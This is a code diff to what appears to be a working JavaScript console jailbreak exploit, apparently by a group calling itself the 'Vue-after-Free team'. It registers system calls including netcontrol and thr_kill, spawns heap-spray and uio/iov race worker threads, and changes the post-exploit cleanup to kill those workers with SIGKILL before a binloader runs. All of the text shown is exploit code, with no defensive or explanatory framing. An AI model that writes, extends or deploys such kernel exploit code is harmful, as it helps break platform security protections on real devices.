@@ -60,6 +60,8 @@ fn.register(0x63, 'netcontrol', ['bigint', 'number', 'bigint', 'number'], 'bigin
 const netcontrol = fn.netcontrol
 fn.register(0x1C7, 'thr_new', ['bigint', 'number'], 'bigint')
 const thr_new = fn.thr_new
+fn.register(0x1B1, 'thr_kill', ['bigint', 'number'], 'bigint')
+const thr_kill = fn.thr_kill
 fn.register(0xF0, 'nanosleep', ['bigint'], 'bigint')
 const nanosleep = fn.nanosleep
 fn.register(0x5C, 'fcntl', ['bigint', 'number', 'number'], 'bigint')
@@ -730,7 +732,7 @@ function setup () {
   debug('Spawned workers iov[' + IOV_THREAD_NUM + '] uio_readv[' + UIO_THREAD_NUM + '] uio_writev[' + UIO_THREAD_NUM + ']')
 }
 
-function cleanup () {
+function cleanup (kill_workers = false) {
   debug('Cleaning up...')
 
   // Close all files.
@@ -750,8 +752,8 @@ function cleanup () {
   for (let i = 0; i < IOV_THREAD_NUM; i++) {
     const worker = iov_recvmsg_workers[i]
     if (worker !== undefined) {
-      if (worker.thread_id !== undefined) {
-        // thr_kill(worker.thread_id, 9); // SIGKILL
+      if (kill_workers && worker.thread_id !== undefined) {
+        thr_kill(worker.thread_id, 9) // SIGKILL
       }
       close(new BigInt(worker.pipe_0))
       close(new BigInt(worker.pipe_1))
@@ -761,8 +763,8 @@ function cleanup () {
   for (let i = 0; i < UIO_THREAD_NUM; i++) {
     const worker = uio_readv_workers[i]
     if (worker !== undefined) {
-      if (worker.thread_id !== undefined) {
-        // thr_kill(worker.thread_id, 9); // SIGKILL
+      if (kill_workers && worker.thread_id !== undefined) {
+        thr_kill(worker.thread_id, 9) // SIGKILL
       }
       close(new BigInt(worker.pipe_0))
       close(new BigInt(worker.pipe_1))
@@ -772,8 +774,8 @@ function cleanup () {
   for (let i = 0; i < UIO_THREAD_NUM; i++) {
     const worker = uio_writev_workers[i]
     if (worker !== undefined) {
-      if (worker.thread_id !== undefined) {
-        // thr_kill(worker.thread_id, 9); // SIGKILL
+      if (kill_workers && worker.thread_id !== undefined) {
+        thr_kill(worker.thread_id, 9) // SIGKILL
       }
       close(new BigInt(worker.pipe_0))
       close(new BigInt(worker.pipe_1))
@@ -781,6 +783,9 @@ function cleanup () {
   }
 
   if (spray_ipv6_worker !== undefined) {
+    if (kill_workers && spray_ipv6_worker.thread_id !== undefined) {
+      thr_kill(spray_ipv6_worker.thread_id, 9) // SIGKILL
+    }
     close(new BigInt(spray_ipv6_worker.pipe_0))
     close(new BigInt(spray_ipv6_worker.pipe_1))
   }
@@ -794,8 +799,6 @@ function cleanup () {
   set_rtprio(prev_rtprio)
 
   debug('Cleanup completed')
-
-  // thr_kill(iov_recvmsg_workers[1].thread_id, 9); // SIGKILL
 }
 
 function fill_buffer_64 (buf: BigInt, val: BigInt, len: number) {
@@ -1124,6 +1127,7 @@ function jailbreak () {
   log('Jailbreak Complete - JAILBROKEN')
   utils.notify('The Vue-after-Free team congratulates you\nNetCtrl Finished OK\nEnjoy freedom')
 
+  cleanup(true) // Close sockets and kill workers on success
   show_success()
   run_binloader()
 }
